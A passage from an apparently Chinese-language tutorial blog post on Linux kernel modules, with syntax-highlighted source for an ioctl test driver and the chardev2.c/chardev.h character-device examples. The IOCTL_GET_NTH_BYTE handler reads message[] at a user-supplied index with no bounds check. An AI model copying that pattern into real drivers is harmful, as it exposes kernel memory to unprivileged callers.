class="keyword">define</span> IOCTL_VAL_MAXNR 3 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_NAME <span class="string">&quot;ioctltest&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> test_ioctl_major = <span class="number">0</span>; </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> num_of_dev = <span class="number">1</span>; </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">test_ioctl_cdev</span>;</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> ioctl_num = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> &#123;</span> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> val; </span><br><span class="line">    <span class="type">rwlock_t</span> lock; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">test_ioctl_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, </span></span><br><span class="line"><span class="params">                             <span class="type">unsigned</span> <span class="type">long</span> arg)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> *<span class="title">ioctl_data</span> =</span> filp-&gt;private_data; </span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> val; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ioctl_arg</span> <span class="title">data</span>;</span> </span><br><span class="line">    <span class="built_in">memset</span>(&amp;data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data)); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALSET: </span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(&amp;data, (<span class="type">int</span> __user *)arg, <span class="keyword">sizeof</span>(data))) &#123; </span><br><span class="line">            retval = -EFAULT; </span><br><span class="line">            <span class="keyword">goto</span> done; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        pr_alert(<span class="string">&quot;IOCTL set val:%x .\n&quot;</span>, data.val); </span><br><span class="line">        write_lock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        ioctl_data-&gt;val = data.val; </span><br><span class="line">        write_unlock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALGET: </span><br><span class="line">        read_lock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        val = ioctl_data-&gt;val; </span><br><span class="line">        read_unlock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">        data.val = val; </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (copy_to_user((<span class="type">int</span> __user *)arg, &amp;data, <span class="keyword">sizeof</span>(data))) &#123; </span><br><span class="line">            retval = -EFAULT; </span><br><span class="line">            <span class="keyword">goto</span> done; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALGET_NUM: </span><br><span class="line">        retval = __put_user(ioctl_num, (<span class="type">int</span> __user *)arg); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> IOCTL_VALSET_NUM: </span><br><span class="line">        ioctl_num = arg; </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">default</span>: </span><br><span class="line">        retval = -ENOTTY; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">done: </span><br><span class="line">    <span class="keyword">return</span> retval; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">test_ioctl_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, </span></span><br><span class="line"><span class="params">                               <span class="type">size_t</span> count, <span class="type">loff_t</span> *f_pos)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> *<span class="title">ioctl_data</span> =</span> filp-&gt;private_data; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> val; </span><br><span class="line">    <span class="type">int</span> retval; </span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">    read_lock(&amp;ioctl_data-&gt;lock); </span><br><span class="line">    val = ioctl_data-&gt;val; </span><br><span class="line">    read_unlock(&amp;ioctl_data-&gt;lock); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (; i &lt; count; i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (copy_to_user(&amp;buf[i], &amp;val, <span class="number">1</span>)) &#123; </span><br><span class="line">            retval = -EFAULT; </span><br><span class="line">            <span class="keyword">goto</span> out; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    retval = count; </span><br><span class="line">out: </span><br><span class="line">    <span class="keyword">return</span> retval; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">test_ioctl_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_alert(<span class="string">&quot;%s call.\n&quot;</span>, __func__); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (filp-&gt;private_data) &#123; </span><br><span class="line">        kfree(filp-&gt;private_data); </span><br><span class="line">        filp-&gt;private_data = <span class="literal">NULL</span>; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">test_ioctl_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">test_ioctl_data</span> *<span class="title">ioctl_data</span>;</span> </span><br><span class="line"> </span><br><span class="line">    pr_alert(<span class="string">&quot;%s call.\n&quot;</span>, __func__); </span><br><span class="line">    ioctl_data = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> test_ioctl_data), GFP_KERNEL); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ioctl_data == <span class="literal">NULL</span>) </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line"> </span><br><span class="line">    rwlock_init(&amp;ioctl_data-&gt;lock); </span><br><span class="line">    ioctl_data-&gt;val = <span class="number">0xFF</span>; </span><br><span class="line">    filp-&gt;private_data = ioctl_data; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123; </span><br><span class="line">    .owner = THIS_MODULE, </span><br><span class="line">    .open = test_ioctl_open, </span><br><span class="line">    .release = test_ioctl_close, </span><br><span class="line">    .read = test_ioctl_read, </span><br><span class="line">    .unlocked_ioctl = test_ioctl_ioctl, </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ioctl_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">dev_t</span> dev; </span><br><span class="line">    <span class="type">int</span> alloc_ret = <span class="number">-1</span>; </span><br><span class="line">    <span class="type">int</span> cdev_ret = <span class="number">-1</span>; </span><br><span class="line">    alloc_ret = alloc_chrdev_region(&amp;dev, <span class="number">0</span>, num_of_dev, DRIVER_NAME); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (alloc_ret) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line"> </span><br><span class="line">    test_ioctl_major = MAJOR(dev); </span><br><span class="line">    cdev_init(&amp;test_ioctl_cdev, &amp;fops); </span><br><span class="line">    cdev_ret = cdev_add(&amp;test_ioctl_cdev, dev, num_of_dev); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (cdev_ret) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line"> </span><br><span class="line">    pr_alert(<span class="string">&quot;%s driver(major: %d) installed.\n&quot;</span>, DRIVER_NAME, </span><br><span class="line">             test_ioctl_major); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">error: </span><br><span class="line">    <span class="keyword">if</span> (cdev_ret == <span class="number">0</span>) </span><br><span class="line">        cdev_del(&amp;test_ioctl_cdev); </span><br><span class="line">    <span class="keyword">if</span> (alloc_ret == <span class="number">0</span>) </span><br><span class="line">        unregister_chrdev_region(dev, num_of_dev); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">ioctl_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">dev_t</span> dev = MKDEV(test_ioctl_major, <span class="number">0</span>); </span><br><span class="line"> </span><br><span class="line">    cdev_del(&amp;test_ioctl_cdev); </span><br><span class="line">    unregister_chrdev_region(dev, num_of_dev); </span><br><span class="line">    pr_alert(<span class="string">&quot;%s driver removed.\n&quot;</span>, DRIVER_NAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(ioctl_init); </span><br><span class="line">module_exit(ioctl_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>); </span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;This is test_ioctl module&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>test_ioctl_ioctl</code>函数有一参数<code>cmd</code>，这个就是<code>ioctl_number</code>，<code>ioctl number</code>编码了major number，ioctl类型，命令和参数。通常使用宏表示(_IO, _IOR, _IOW, _IOWR)。内核与程序都应包含ioctl的头文件。内核模块调用的头文件是<code>chardev.h</code>，程序调用为<code>userspace_ioctl.c</code>。</p>
<p>另外，我们需要注意的是，对共享资源的并发访问将导致竞态条件。。解决方法是使用原子比较与交换(atomic Compare-And-Swap (CAS))。</p>
<p>一个完整的与device file通信的示例</p>
<p><code>char_dev2.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * chardev2.c - Create an input/output character device </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/atomic.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> <span class="comment">/* Specifically, a module */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/printk.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span> <span class="comment">/* for get_user and put_user */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/errno.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;chardev.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 0 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;char_dev&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_LEN 80 </span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> </span><br><span class="line">    CDEV_NOT_USED = <span class="number">0</span>, </span><br><span class="line">    CDEV_EXCLUSIVE_OPEN = <span class="number">1</span>, </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Is the device open right now? Used to prevent concurrent access into </span></span><br><span class="line"><span class="comment"> * the same device </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">atomic_t</span> already_open = ATOMIC_INIT(CDEV_NOT_USED); </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* The message the device will give when asked */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">char</span> message[BUF_LEN + <span class="number">1</span>]; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">cls</span>;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This is called whenever a process attempts to open the device file */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_info(<span class="string">&quot;device_open(%p)\n&quot;</span>, file); </span><br><span class="line"> </span><br><span class="line">    try_module_get(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> SUCCESS; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    pr_info(<span class="string">&quot;device_release(%p,%p)\n&quot;</span>, inode, file); </span><br><span class="line"> </span><br><span class="line">    module_put(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> SUCCESS; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called whenever a process which has already opened the </span></span><br><span class="line"><span class="comment"> * device file attempts to read from it. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="comment">/* see include/linux/fs.h   */</span> </span></span><br><span class="line"><span class="params">                           <span class="type">char</span> __user *buffer, <span class="comment">/* buffer to be filled  */</span> </span></span><br><span class="line"><span class="params">                           <span class="type">size_t</span> length, <span class="comment">/* length of the buffer     */</span> </span></span><br><span class="line"><span class="params">                           <span class="type">loff_t</span> *offset)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">/* Number of bytes actually written to the buffer */</span> </span><br><span class="line">    <span class="type">int</span> bytes_read = <span class="number">0</span>; </span><br><span class="line">    <span class="comment">/* How far did the process reading the message get? Useful if the message </span></span><br><span class="line"><span class="comment">     * is larger than the size of the buffer we get to fill in device_read. </span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *message_ptr = message; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!*(message_ptr + *offset)) &#123; <span class="comment">/* we are at the end of message */</span> </span><br><span class="line">        *offset = <span class="number">0</span>; <span class="comment">/* reset the offset */</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* signify end of file */</span> </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    message_ptr += *offset; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Actually put the data into the buffer */</span> </span><br><span class="line">    <span class="keyword">while</span> (length &amp;&amp; *message_ptr) &#123; </span><br><span class="line">        <span class="comment">/* Because the buffer is in the user data segment, not the kernel </span></span><br><span class="line"><span class="comment">         * data segment, assignment would not work. Instead, we have to </span></span><br><span class="line"><span class="comment">         * use put_user which copies data from the kernel data segment to </span></span><br><span class="line"><span class="comment">         * the user data segment. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        put_user(*(message_ptr++), buffer++); </span><br><span class="line">        length--; </span><br><span class="line">        bytes_read++; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;Read %d bytes, %ld left\n&quot;</span>, bytes_read, length); </span><br><span class="line"> </span><br><span class="line">    *offset += bytes_read; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Read functions are supposed to return the number of bytes actually </span></span><br><span class="line"><span class="comment">     * inserted into the buffer. </span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="keyword">return</span> bytes_read; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* called when somebody tries to write into our device file. */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buffer, </span></span><br><span class="line"><span class="params">                            <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> i; </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;device_write(%p,%p,%ld)&quot;</span>, file, buffer, length); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length &amp;&amp; i &lt; BUF_LEN; i++) </span><br><span class="line">        get_user(message[i], buffer + i); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Again, return the number of input characters used. */</span> </span><br><span class="line">    <span class="keyword">return</span> i; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called whenever a process tries to do an ioctl on our </span></span><br><span class="line"><span class="comment"> * device file. We get two extra parameters (additional to the inode and file </span></span><br><span class="line"><span class="comment"> * structures, which all device functions get): the number of the ioctl called </span></span><br><span class="line"><span class="comment"> * and the parameter given to the ioctl function. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the ioctl is write or read/write (meaning output is returned to the </span></span><br><span class="line"><span class="comment"> * calling process), the ioctl call returns the output of this function. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">long</span> </span><br><span class="line"><span class="title function_">device_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="comment">/* ditto */</span> </span></span><br><span class="line"><span class="params">             <span class="type">unsigned</span> <span class="type">int</span> ioctl_num, <span class="comment">/* number and param for ioctl */</span> </span></span><br><span class="line"><span class="params">             <span class="type">unsigned</span> <span class="type">long</span> ioctl_param)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> i; </span><br><span class="line">    <span class="type">long</span> ret = SUCCESS; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* We don&#x27;t want to talk to two processes at the same time. */</span> </span><br><span class="line">    <span class="keyword">if</span> (atomic_cmpxchg(&amp;already_open, CDEV_NOT_USED, CDEV_EXCLUSIVE_OPEN)) </span><br><span class="line">        <span class="keyword">return</span> -EBUSY; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Switch according to the ioctl called */</span> </span><br><span class="line">    <span class="keyword">switch</span> (ioctl_num) &#123; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_SET_MSG: &#123; </span><br><span class="line">        <span class="comment">/* Receive a pointer to a message (in user space) and set that to </span></span><br><span class="line"><span class="comment">         * be the device&#x27;s message. Get the parameter given to ioctl by </span></span><br><span class="line"><span class="comment">         * the process. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        <span class="type">char</span> __user *tmp = (<span class="type">char</span> __user *)ioctl_param; </span><br><span class="line">        <span class="type">char</span> ch; </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Find the length of the message */</span> </span><br><span class="line">        get_user(ch, tmp); </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; ch &amp;&amp; i &lt; BUF_LEN; i++, tmp++) </span><br><span class="line">            get_user(ch, tmp); </span><br><span class="line"> </span><br><span class="line">        device_write(file, (<span class="type">char</span> __user *)ioctl_param, i, <span class="literal">NULL</span>); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_GET_MSG: &#123; </span><br><span class="line">        <span class="type">loff_t</span> offset = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Give the current message to the calling process - the parameter </span></span><br><span class="line"><span class="comment">         * we got is a pointer, fill it. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        i = device_read(file, (<span class="type">char</span> __user *)ioctl_param, <span class="number">99</span>, &amp;offset); </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Put a zero at the end of the buffer, so it will be properly </span></span><br><span class="line"><span class="comment">         * terminated. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        put_user(<span class="string">&#x27;\0&#x27;</span>, (<span class="type">char</span> __user *)ioctl_param + i); </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">case</span> IOCTL_GET_NTH_BYTE: </span><br><span class="line">        <span class="comment">/* This ioctl is both input (ioctl_param) and output (the return </span></span><br><span class="line"><span class="comment">         * value of this function). </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        ret = (<span class="type">long</span>)message[ioctl_param]; </span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* We&#x27;re now ready for our next caller */</span> </span><br><span class="line">    <span class="type">atomic_set</span>(&amp;already_open, CDEV_NOT_USED); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Module Declarations */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This structure will hold the functions to be called when a process does </span></span><br><span class="line"><span class="comment"> * something to the device we created. Since a pointer to this structure </span></span><br><span class="line"><span class="comment"> * is kept in the devices table, it can&#x27;t be local to init_module. NULL is </span></span><br><span class="line"><span class="comment"> * for unimplemented functions. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123; </span><br><span class="line">    .read = device_read, </span><br><span class="line">    .write = device_write, </span><br><span class="line">    .unlocked_ioctl = device_ioctl, </span><br><span class="line">    .open = device_open, </span><br><span class="line">    .release = device_release, <span class="comment">/* a.k.a. close */</span> </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Initialize the module - Register the character device */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">chardev2_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">/* Register the character device (atleast try) */</span> </span><br><span class="line">    <span class="type">int</span> ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &amp;fops); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Negative values signify an error */</span> </span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        pr_alert(<span class="string">&quot;%s failed with %d\n&quot;</span>, </span><br><span class="line">                 <span class="string">&quot;Sorry, registering the character device &quot;</span>, ret_val); </span><br><span class="line">        <span class="keyword">return</span> ret_val; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(6, 4, 0) </span></span><br><span class="line">    cls = class_create(DEVICE_FILE_NAME); </span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line">    cls = class_create(THIS_MODULE, DEVICE_FILE_NAME); </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line">    device_create(cls, <span class="literal">NULL</span>, MKDEV(MAJOR_NUM, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_FILE_NAME); </span><br><span class="line"> </span><br><span class="line">    pr_info(<span class="string">&quot;Device created on /dev/%s\n&quot;</span>, DEVICE_FILE_NAME); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Cleanup - unregister the appropriate file from /proc */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">chardev2_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    device_destroy(cls, MKDEV(MAJOR_NUM, <span class="number">0</span>)); </span><br><span class="line">    class_destroy(cls); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Unregister the device */</span> </span><br><span class="line">    unregister_chrdev(MAJOR_NUM, DEVICE_NAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(chardev2_init); </span><br><span class="line">module_exit(chardev2_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>chardev.h</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * chardev.h - the header file with the ioctl definitions. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The declarations here have to be in a header file, because they need </span></span><br><span class="line"><span class="comment"> * to be known both to the kernel module (in chardev2.c) and the process </span></span><br><span class="line"><span class="comment"> * calling ioctl() (in userspace_ioctl.c). </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CHARDEV_H </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHARDEV_H </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioctl.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* The major device number. We can not rely on dynamic registration </span></span><br><span class="line"><span class="comment"> * any more, because ioctls need to know it. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAJOR_NUM 100 </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Set the message of the device driver */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_SET_MSG _IOW(MAJOR_NUM, 0, char *) </span></span><br><span class="line"><span class="comment">/* _IOW means that we are creating an ioctl command number for passing </span></span><br><span class="line"><span class="comment"> * information from a user process to the kernel module. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The first arguments, MAJOR_NUM, is the major device number we are using. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The second argument is the number of the command (there could be several </span></span><br><span class="line"><span class="comment"> * with different meanings). </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The third argument is the type we want to get from the process to the </span></span><br><span class="line"><span class="comment"> * kernel. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Get the message of the device driver */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_GET_MSG _IOR(MAJOR_NUM, 1, char *) </span></span><br><span class="line"><span class="comment">/* This IOCTL is used for output, to get the message of the device driver. </span></span><br><span class="line"><span class="comment"> * However, we still need the buffer to place the message in to be input, </span></span><br><span class="line"><span class="comment"> * as it is allocated by the process. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Get the n&#x27;th byte of the message */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_GET_NTH_BYTE _IOWR(MAJOR_NUM, 2, int) </span></span><br><span class="line"><span class="comment">/* The IOCTL is used for both input and output. It receives from the user </span></span><br><span class="line"><span class="comment"> * a number, n, and returns message[n]. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* The name of the device file */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_FILE_NAME <span class="string">&quot;char_dev&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_PATH <span class="string">&quot;/dev/char_dev&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

